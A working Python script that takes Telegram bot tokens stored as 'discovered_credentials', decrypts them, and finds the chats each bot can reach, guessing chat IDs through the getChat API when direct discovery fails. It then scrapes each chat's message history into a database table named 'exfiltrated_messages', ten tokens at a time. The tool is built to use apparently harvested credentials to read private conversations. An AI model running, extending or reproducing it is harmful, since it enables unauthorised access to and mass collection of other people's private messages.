import asyncio
import sys
import os
import time
import requests

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.services.scraper_srv import scraper_service

def get_known_chat_ids():
    """Fetch all unique known chat IDs from database"""
    try:
        res = db.table("discovered_credentials").select("chat_id").execute()
        if not res.data:
            return []
        # Filter None and duplicates
        ids = list(set([r['chat_id'] for r in res.data if r.get('chat_id')]))
        print(f"ℹ️ Found {len(ids)} unique known chat IDs in database.")
        return ids
    except Exception as e:
        print(f"⚠️ Failed to fetch known chat IDs: {e}")
        return []

def try_match_chat_id(token: str, candidates: list) -> int | None:
    """
    Try to find which chat ID the bot belongs to from a list of candidates.
    Returns the first matching chat_id or None.
    """
    print(f"  🕵️‍♂️ Orphan Token: Checking against {len(candidates)} known chats...")
    
    for cid in candidates:
        try:
            # check if bot can see the chat
            url = f"https://api.telegram.org/bot{token}/getChat"
            res = requests.get(url, params={'chat_id': cid}, timeout=3)
            
            if res.status_code == 200 and res.json().get('ok'):
                chat = res.json()['result']
                name = chat.get('title') or chat.get('username') or str(cid)
                print(f"    ✨ MATCH FOUND! Chat: {name} ({cid})")
                return cid
                
            # Rate limit protection
            # time.sleep(0.1) 
        except Exception:
            pass
            
    return None

async def process_credential(semaphore, cred, i, total, known_chat_ids):
    """
    Process a single credential with rate limiting via Semaphore.
    """
    from app.core.security import security
    
    async with semaphore:
        cred_id = cred['id']
        token = cred['bot_token']
        
        # Auto-decrypt if needed
        if token.startswith("gAAAA"):
            try:
                token = security.decrypt(token)
            except:
                print(f"   ❌ Could not decrypt token for {cred_id}, skipping.")
                return 0

        chat_id = cred.get('chat_id')
        status = cred.get('status')
        bot_name = cred.get('meta', {}).get('bot_username', 'Unknown')
        
        print(f"\n🔄 [{i}/{total}] Processing Bot: @{bot_name} (ID: {cred_id}) | Status: {status}")
        
        # ENRICHMENT
        if not chat_id:
            print(f"   🔎 [{cred_id}] Status is Pending/No Chat. Attempting Discovery...")
            try:
                bot_info, chats = await scraper_service.discover_chats(token)
                if chats:
                    first_chat = chats[0]
                    chat_id = first_chat['id']
                    chat_name = first_chat['name']
                    print(f"   ✅ [{cred_id}] Discovered Chat: {chat_name} ({chat_id})")
                    
                    db.table("discovered_credentials").update({
                        "chat_id": chat_id,
                        "status": "active",
                        "meta": {**cred.get('meta', {}), "chat_name": chat_name}
                    }).eq("id", cred_id).execute()
                    print(f"   💾 [{cred_id}] Updated DB to ACTIVE.")
                else:
                    # USE SHARED ORPHAN MATCHING
                    print(f"   ⚠️ [{cred_id}] No chats found via API. Attempting Orphan Matching (Async)...")
                    matched_id = None
                    if known_chat_ids:
                        matched_id = await scraper_service.attempt_orphan_match(token, known_chat_ids)
                    
                    if matched_id:
                         chat_id = matched_id
                         chat_name = "Orphan Match"
                         
                         db.table("discovered_credentials").update({
                            "chat_id": chat_id,
                            "status": "active",
                            "meta": {**cred.get('meta', {}), "chat_name": chat_name, "orphan_match": True}
                         }).eq("id", cred_id).execute()
                         print(f"   💾 [{cred_id}] [Orphan] Updated DB to ACTIVE.")
                    else:
                        print(f"   ⚠️ [{cred_id}] Orphan matching failed. Skipping.")
                        return 0
            except Exception as e:
                print(f"   ❌ [{cred_id}] Discovery failed: {e}")
                return 0
        
        # SCRAPE
        print(f"   🎯 [{cred_id}] Target Chat: {chat_id}")
        saved_count = 0
        try:
            print(f"   ⏳ [{cred_id}] Scraping history...")
            messages = await scraper_service.scrape_history(token, chat_id)
            print(f"   ✅ [{cred_id}] Retrieved {len(messages)} messages.")
            
            for msg in messages:
                msg["credential_id"] = cred_id
                msg.pop('chat_id', None) 
                
                try:
                    db.table("exfiltrated_messages").insert(msg).execute()
                    saved_count += 1
                except Exception as e:
                    if "duplicate key" not in str(e) and "unique constraint" not in str(e):
                        print(f"      ❌ Insert Failed for Msg {msg.get('telegram_msg_id')}: {e}")
            
            print(f"   💾 [{cred_id}] Saved {saved_count} NEW messages.")
            
        except Exception as e:
            print(f"   ❌ [{cred_id}] Error scraping: {e}")
            
        # Slight delay after releasing semaphore to space out bursts
        await asyncio.sleep(0.5) 
        return saved_count

async def run_manual_worker():
    print("🚀 Starting LOCAL MANUAL WORKER (Scraping Active Credentials)...")
    
    # Configure logging
    import logging
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    logging.getLogger('telethon').setLevel(logging.WARNING)

    # 0. Load Known Chats
    known_chat_ids = get_known_chat_ids()

    # 1. Fetch Credentials
    try:
        response_active = db.table("discovered_credentials").select("*").eq("status", "active").execute()
        response_pending = db.table("discovered_credentials").select("*").eq("status", "pending").execute()
        creds = response_active.data + response_pending.data
    except Exception as e:
        print(f"❌ DB Error: {e}")
        return

    if not creds:
        print("⚠️ No ACTIVE or PENDING credentials found in DB.")
        return

    print(f"📋 Found {len(creds)} credentials. Processing with CONCURRENCY=10...")
    print("-------------------------------------------------")

    # CONCURRENCY SETUP
    semaphore = asyncio.Semaphore(10)
    tasks = []
    
    for i, cred in enumerate(creds):
        # Create coroutine for each credential
        tasks.append(process_credential(semaphore, cred, i+1, len(creds), known_chat_ids))
    
    # Run all tasks
    results = await asyncio.gather(*tasks)
    total_msgs = sum(results)

    print("\n-------------------------------------------------")
    print(f"🏁 Manual Worker Complete. Total New Messages: {total_msgs}")
    print("   Check the Web Dashboard or Database to view content.")

if __name__ == "__main__":
    asyncio.run(run_manual_worker())
